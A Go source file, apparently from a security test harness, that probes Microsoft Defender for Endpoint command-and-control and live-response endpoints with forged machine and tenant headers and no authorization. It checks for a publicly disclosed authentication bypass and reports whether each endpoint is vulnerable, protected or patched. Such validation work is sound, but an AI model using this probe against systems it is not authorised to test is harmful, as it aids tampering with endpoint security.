// mde_network_tester.go - Test actual MDE endpoint authentication
// This module tests if MDE cloud endpoints accept unauthenticated requests
// Build: Embedded in main test binary

//go:build windows
// +build windows

package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// MDEEndpoint represents an MDE cloud endpoint
type MDEEndpoint struct {
	Region      string `json:"region"`
	URL         string `json:"url"`
	Description string `json:"description"`
}

// NetworkTestResult contains the results of network testing
type NetworkTestResult struct {
	Endpoint          string    `json:"endpoint"`
	Region            string    `json:"region"`
	RequestSent       bool      `json:"requestSent"`
	StatusCode        int       `json:"statusCode"`
	StatusText        string    `json:"statusText"`
	ResponseSize      int       `json:"responseSize"`
	ResponseTime      int64     `json:"responseTimeMs"`
	AuthenticationReq bool      `json:"authenticationRequired"`
	Vulnerable        bool      `json:"vulnerable"`
	ErrorMessage      string    `json:"errorMessage"`
	Timestamp         time.Time `json:"timestamp"`
}

// NetworkTestSummary contains overall test results
type NetworkTestSummary struct {
	TestStart         time.Time           `json:"testStart"`
	TestEnd           time.Time           `json:"testEnd"`
	TotalEndpoints    int                 `json:"totalEndpoints"`
	TestedEndpoints   int                 `json:"testedEndpoints"`
	SuccessfulTests   int                 `json:"successfulTests"`
	FailedTests       int                 `json:"failedTests"`
	VulnerableCount   int                 `json:"vulnerableCount"`
	ProtectedCount    int                 `json:"protectedCount"`
	DeprecatedCount   int                 `json:"deprecatedCount"` // 404s - endpoints removed/patched
	NetworkFailures   int                 `json:"networkFailures"` // Connection failures
	Results           []NetworkTestResult `json:"results"`
	CertBypassActive  bool                `json:"certBypassActive"`
	OverallVulnerable bool                `json:"overallVulnerable"`
	EndpointsPatched  bool                `json:"endpointsPatched"` // All returned 404
}

// TestMDENetworkAuthentication tests MDE endpoint authentication
func TestMDENetworkAuthentication(identifiers *MDEIdentifiers, certBypassActive bool) *NetworkTestSummary {
	fmt.Println()
	fmt.Println("[*] ========================================")
	fmt.Println("[*] Phase: Network Communication Test")
	fmt.Println("[*] ========================================")
	fmt.Println()

	summary := &NetworkTestSummary{
		TestStart:        time.Now(),
		Results:          []NetworkTestResult{},
		CertBypassActive: certBypassActive,
	}

	// Define MDE endpoints to test
	endpoints := getMDEEndpoints()
	summary.TotalEndpoints = len(endpoints)

	fmt.Printf("[*] Testing %d MDE cloud endpoints\n", len(endpoints))
	fmt.Printf("[*] Using Machine ID: %s\n", identifiers.MachineID)
	fmt.Printf("[*] Using Tenant ID: %s\n", identifiers.TenantID)
	fmt.Printf("[*] Certificate Bypass: %v\n", certBypassActive)
	fmt.Println()

	// Test each endpoint
	for i, endpoint := range endpoints {
		fmt.Printf("[%d/%d] Testing %s (%s)...\n", i+1, len(endpoints), endpoint.Region, endpoint.URL)

		result := testEndpoint(endpoint, identifiers)
		summary.Results = append(summary.Results, result)
		summary.TestedEndpoints++

		if result.RequestSent {
			summary.SuccessfulTests++

			if result.Vulnerable {
				summary.VulnerableCount++
				fmt.Printf("    [!] VULNERABLE: Unauthenticated access accepted (%d)\n", result.StatusCode)
			} else if result.AuthenticationReq {
				summary.ProtectedCount++
				fmt.Printf("    [+] PROTECTED: Authentication required (%d)\n", result.StatusCode)
			} else if result.StatusCode == 404 {
				// Track deprecated/patched endpoints separately
				summary.DeprecatedCount++
				fmt.Printf("    [!] DEPRECATED: Endpoint patched/removed (%d)\n", result.StatusCode)
			} else {
				fmt.Printf("    [*] Status: %d - %s\n", result.StatusCode, result.StatusText)
			}
		} else {
			summary.FailedTests++
			summary.NetworkFailures++
			fmt.Printf("    [!] Request failed: %s\n", result.ErrorMessage)
		}

		// Small delay between requests
		time.Sleep(500 * time.Millisecond)
	}

	// Calculate overall vulnerability status
	summary.OverallVulnerable = summary.VulnerableCount > 0

	// Check if all successful requests returned 404 (endpoints patched)
	if summary.SuccessfulTests > 0 && summary.DeprecatedCount == summary.SuccessfulTests {
		summary.EndpointsPatched = true
	}

	summary.TestEnd = time.Now()

	// Display summary
	displayNetworkTestSummary(summary)

	// Save results to file
	saveNetworkTestResults(summary)

	return summary
}

// getMDEEndpoints returns list of MDE endpoints to test
func getMDEEndpoints() []MDEEndpoint {
	return []MDEEndpoint{
		{
			Region:      "EUS",
			URL:         "https://winatp-gw-eus.microsoft.com/edr/commands/cnc",
			Description: "East US - Command and Control",
		},
		{
			Region:      "WEU",
			URL:         "https://winatp-gw-weu.microsoft.com/edr/commands/cnc",
			Description: "West Europe - Command and Control",
		},
		{
			Region:      "CUS",
			URL:         "https://winatp-gw-cus.microsoft.com/edr/commands/cnc",
			Description: "Central US - Command and Control",
		},
		{
			Region:      "NEU",
			URL:         "https://winatp-gw-neu.microsoft.com/edr/commands/cnc",
			Description: "North Europe - Command and Control",
		},
		{
			Region:      "EUS-SenseIR",
			URL:         "https://winatp-gw-eus.microsoft.com/senseir/v1/actions/",
			Description: "East US - Live Response Actions",
		},
	}
}

// testEndpoint tests a single MDE endpoint
func testEndpoint(endpoint MDEEndpoint, identifiers *MDEIdentifiers) NetworkTestResult {
	result := NetworkTestResult{
		Endpoint:  endpoint.URL,
		Region:    endpoint.Region,
		Timestamp: time.Now(),
	}

	startTime := time.Now()

	// Create HTTP client with timeout
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				// For testing purposes, we can use system cert pool
				// In real exploitation, cert pinning bypass would be active
				InsecureSkipVerify: false, // Respect certs by default
			},
		},
	}

	// Create request
	req, err := http.NewRequest("GET", endpoint.URL, nil)
	if err != nil {
		result.ErrorMessage = fmt.Sprintf("Failed to create request: %v", err)
		return result
	}

	// Add headers - deliberately OMIT authorization
	req.Header.Set("User-Agent", "Microsoft-SenseIR/1.0")
	req.Header.Set("X-Machine-Id", identifiers.MachineID)
	req.Header.Set("X-Tenant-Id", identifiers.TenantID)

	// Deliberately NOT setting:
	// - Authorization header
	// - Msadeviceticket header
	// This tests if the vulnerability exists

	fmt.Println("    [*] Request headers:")
	fmt.Printf("        User-Agent: %s\n", req.Header.Get("User-Agent"))
	fmt.Printf("        X-Machine-Id: %s\n", identifiers.MachineID)
	fmt.Printf("        X-Tenant-Id: %s\n", identifiers.TenantID)
	fmt.Println("        Authorization: [DELIBERATELY OMITTED]")
	fmt.Println("        Msadeviceticket: [DELIBERATELY OMITTED]")

	// Send request
	resp, err := client.Do(req)

	responseTime := time.Since(startTime).Milliseconds()
	result.ResponseTime = responseTime

	if err != nil {
		result.ErrorMessage = fmt.Sprintf("Request error: %v", err)

		// Check if it's a network/DNS error (expected if isolated)
		if strings.Contains(err.Error(), "no such host") {
			result.ErrorMessage = "DNS resolution failed (network isolated)"
		} else if strings.Contains(err.Error(), "timeout") {
			result.ErrorMessage = "Request timeout (network blocked or endpoint unreachable)"
		} else if strings.Contains(err.Error(), "certificate") {
			result.ErrorMessage = "Certificate validation failed (cert pinning active)"
		}

		return result
	}
	defer resp.Body.Close()

	result.RequestSent = true
	result.StatusCode = resp.StatusCode
	result.StatusText = resp.Status

	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err == nil {
		result.ResponseSize = len(body)
	}

	// Analyze response
	switch resp.StatusCode {
	case 200:
		// Success - This is CRITICAL: unauthenticated access was accepted!
		result.Vulnerable = true
		result.AuthenticationReq = false
		fmt.Println("    [!] CRITICAL: Status 200 - Unauthenticated request accepted!")
		fmt.Printf("    [!] Response size: %d bytes\n", result.ResponseSize)

		// Log a sample of the response (first 200 chars)
		if len(body) > 0 {
			sample := string(body)
			if len(sample) > 200 {
				sample = sample[:200] + "..."
			}
			fmt.Printf("    [!] Response sample: %s\n", sample)
		}

	case 401:
		// Unauthorized - Good, authentication is required
		result.Vulnerable = false
		result.AuthenticationReq = true
		fmt.Println("    [+] Status 401 - Authentication required (expected)")

	case 403:
		// Forbidden - Also good, access denied
		result.Vulnerable = false
		result.AuthenticationReq = true
		fmt.Println("    [+] Status 403 - Access forbidden (expected)")

	case 404:
		// Not Found - Endpoint has been removed/changed (likely patched after vulnerability disclosure)
		result.Vulnerable = false
		result.AuthenticationReq = false
		result.StatusText = "Endpoint Deprecated/Patched"
		fmt.Println("    [!] Status 404 - Endpoint deprecated (likely patched by Microsoft)")

	case 500, 502, 503:
		// Server error - Can't determine vulnerability
		result.Vulnerable = false
		result.AuthenticationReq = false
		fmt.Printf("    [*] Status %d - Server error\n", resp.StatusCode)

	default:
		// Other status codes
		result.Vulnerable = false
		result.AuthenticationReq = false
		fmt.Printf("    [*] Status %d - %s\n", resp.StatusCode, resp.Status)
	}

	return result
}

// displayNetworkTestSummary displays test results summary
func displayNetworkTestSummary(summary *NetworkTestSummary) {
	duration := summary.TestEnd.Sub(summary.TestStart)

	fmt.Println()
	fmt.Println("[*] ========================================")
	fmt.Println("[*] Network Test Summary")
	fmt.Println("[*] ========================================")
	fmt.Println()

	fmt.Printf("Test Duration:       %v\n", duration)
	fmt.Printf("Total Endpoints:     %d\n", summary.TotalEndpoints)
	fmt.Printf("Successful Tests:    %d\n", summary.SuccessfulTests)
	fmt.Printf("Failed Tests:        %d\n", summary.FailedTests)
	fmt.Println()

	fmt.Printf("Vulnerable:          %d endpoint(s)\n", summary.VulnerableCount)
	fmt.Printf("Protected:           %d endpoint(s)\n", summary.ProtectedCount)
	fmt.Printf("Deprecated/Patched:  %d endpoint(s)\n", summary.DeprecatedCount)
	fmt.Printf("Network Failures:    %d endpoint(s)\n", summary.NetworkFailures)
	fmt.Println()

	if summary.OverallVulnerable {
		fmt.Println("[!] ========================================")
		fmt.Println("[!] CRITICAL FINDING")
		fmt.Println("[!] ========================================")
		fmt.Println("[!] ")
		fmt.Println("[!] One or more MDE endpoints accepted")
		fmt.Println("[!] unauthenticated requests!")
		fmt.Println("[!] ")
		fmt.Println("[!] This confirms the InfoGuard Labs")
		fmt.Println("[!] authentication bypass vulnerability.")
		fmt.Println("[!] ")
		fmt.Println("[!] System is VULNERABLE to:")
		fmt.Println("[!]   - Command interception")
		fmt.Println("[!]   - Isolation status spoofing")
		fmt.Println("[!]   - Configuration exfiltration")
		fmt.Println("[!] ========================================")
	} else if summary.EndpointsPatched {
		// All endpoints returned 404 - they've been patched/removed
		fmt.Println("[+] ========================================")
		fmt.Println("[+] ENDPOINTS PATCHED/DEPRECATED")
		fmt.Println("[+] ========================================")
		fmt.Println("[+] ")
		fmt.Println("[+] All tested endpoints returned 404.")
		fmt.Println("[+] This indicates Microsoft has likely")
		fmt.Println("[+] patched the vulnerability by removing")
		fmt.Println("[+] or changing the endpoints.")
		fmt.Println("[+] ")
		fmt.Println("[+] InfoGuard Labs disclosed this")
		fmt.Println("[+] vulnerability in October 2025.")
		fmt.Println("[+] ")
		fmt.Println("[+] Status: PATCHED")
		fmt.Println("[+] ========================================")
	} else if summary.ProtectedCount > 0 {
		// Got valid responses requiring authentication
		fmt.Println("[+] ========================================")
		fmt.Println("[+] PROTECTED STATUS")
		fmt.Println("[+] ========================================")
		fmt.Println("[+] ")
		fmt.Println("[+] Tested endpoints require proper")
		fmt.Println("[+] authentication (401/403 responses).")
		fmt.Println("[+] ")
		fmt.Println("[+] Status: PROTECTED")
		fmt.Println("[+] ========================================")
	} else if summary.NetworkFailures > 0 {
		// Network connectivity issues
		fmt.Println("[*] ========================================")
		fmt.Println("[*] NETWORK CONNECTIVITY ISSUES")
		fmt.Println("[*] ========================================")
		fmt.Println("[*] ")
		fmt.Println("[*] Could not reach MDE endpoints.")
		fmt.Println("[*] Possible reasons:")
		fmt.Println("[*]   - Network is isolated")
		fmt.Println("[*]   - DNS blocked")
		fmt.Println("[*]   - Firewall rules")
		fmt.Println("[*]   - System not connected to internet")
		fmt.Println("[*] ")
		fmt.Println("[*] Status: INCONCLUSIVE")
		fmt.Println("[*] ========================================")
	} else {
		// Mixed or unclear results
		fmt.Println("[*] ========================================")
		fmt.Println("[*] MIXED RESULTS")
		fmt.Println("[*] ========================================")
		fmt.Println("[*] ")
		fmt.Println("[*] Received varied responses from")
		fmt.Println("[*] different endpoints.")
		fmt.Println("[*] ")
		fmt.Println("[*] Status: INCONCLUSIVE")
		fmt.Println("[*] ========================================")
	}

	fmt.Println()
}

// saveNetworkTestResults saves test results to file
func saveNetworkTestResults(summary *NetworkTestSummary) error {
	targetDir := "C:\\F0"
	os.MkdirAll(targetDir, 0755)

	filePath := filepath.Join(targetDir, "network_test_results.json")

	data, err := json.MarshalIndent(summary, "", "  ")
	if err != nil {
		return err
	}

	fmt.Printf("[*] Network test results saved to: %s\n", filePath)

	return os.WriteFile(filePath, data, 0644)
}

// CreateNetworkTestReport creates a human-readable report
func CreateNetworkTestReport(summary *NetworkTestSummary) error {
	targetDir := "C:\\F0"
	filePath := filepath.Join(targetDir, "network_test_report.txt")

	report := fmt.Sprintf(`MDE Network Authentication Test Report
============================================================

Test Date: %s
Duration: %v
Certificate Bypass Active: %v

Test Results:
  Total Endpoints Tested: %d
  Successful Tests: %d
  Failed Tests: %d

Security Assessment:
  Vulnerable Endpoints: %d
  Protected Endpoints: %d
  Overall Status: %s

Detailed Results:
`, summary.TestStart.Format("2006-01-02 15:04:05"),
		summary.TestEnd.Sub(summary.TestStart),
		summary.CertBypassActive,
		summary.TotalEndpoints,
		summary.SuccessfulTests,
		summary.FailedTests,
		summary.VulnerableCount,
		summary.ProtectedCount,
		getOverallStatus(summary))

	for i, result := range summary.Results {
		report += fmt.Sprintf(`
Test #%d: %s (%s)
  Status Code: %d
  Response Time: %d ms
  Response Size: %d bytes
  Authentication Required: %v
  Vulnerable: %v
`, i+1, result.Region, result.Endpoint,
			result.StatusCode,
			result.ResponseTime,
			result.ResponseSize,
			result.AuthenticationReq,
			result.Vulnerable)

		if result.ErrorMessage != "" {
			report += fmt.Sprintf("  Error: %s\n", result.ErrorMessage)
		}
	}

	report += `
============================================================

Recommendations:
`

	if summary.OverallVulnerable {
		report += `
  CRITICAL: Unauthenticated access detected!

  Immediate Actions Required:
  1. Verify MDE is fully patched
  2. Check for unauthorized access in logs
  3. Review isolation command history
  4. Validate device onboarding status
  5. Contact Microsoft Security Response Center
`
	} else if summary.ProtectedCount > 0 {
		report += `
  GOOD: Authentication is properly enforced

  Continue Monitoring:
  1. Regular security assessments
  2. Monitor for new vulnerabilities
  3. Keep MDE updated
  4. Review access logs periodically
`
	} else {
		report += `
  INCONCLUSIVE: Could not reach endpoints

  Actions to Consider:
  1. Verify network connectivity
  2. Check firewall rules
  3. Confirm DNS resolution
  4. Test from different network
  5. Review network isolation policies
`
	}

	return os.WriteFile(filePath, []byte(report), 0644)
}

// getOverallStatus returns a human-readable status
func getOverallStatus(summary *NetworkTestSummary) string {
	if summary.OverallVulnerable {
		return "VULNERABLE - Unauthenticated access detected"
	} else if summary.ProtectedCount > 0 {
		return "PROTECTED - Authentication enforced"
	} else if summary.FailedTests == summary.TotalEndpoints {
		return "INCONCLUSIVE - No endpoints reachable"
	} else {
		return "MIXED - Review detailed results"
	}
}
